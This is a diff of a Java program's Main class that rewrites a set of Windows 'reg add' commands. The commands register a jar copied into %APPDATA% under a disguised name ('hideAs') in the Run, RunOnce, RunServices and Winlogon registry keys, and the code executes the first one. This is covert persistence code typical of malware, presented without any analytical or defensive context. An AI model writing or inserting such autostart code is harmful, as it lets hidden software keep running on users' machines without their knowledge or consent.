@@ -303,12 +303,12 @@ public class Main {
                 writeToFile(new File("@echo off & java -jar " + batch_file + " & exit"), "@echo off & java -jar " + new_name + " & exit");
 
                 String[] reg_start = {
-                        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("windir") + "\\System32\\cmd.exe" + " -cmd \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("windir") + "\\System32\\cmd.exe" + " -cmd \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("windir") + "\\System32\\cmd.exe" + " -cmd \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("windir") + "\\System32\\cmd.exe" + " -cmd \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("windir") + "\\System32\\cmd.exe" + " -cmd \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
-                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("windir") + "\\System32\\cmd.exe" + " -cmd \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
+                        "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v "+hideAs+" /t REG_SZ /d \"" +System.getenv("java_home") + "\\bin\\java.exe\" -jar \"" +System.getenv("APPDATA") + "\\" + batch_file+"\"",
                 };
                 Process proc = Runtime.getRuntime().exec(reg_start[0]);
                 proc.destroy();
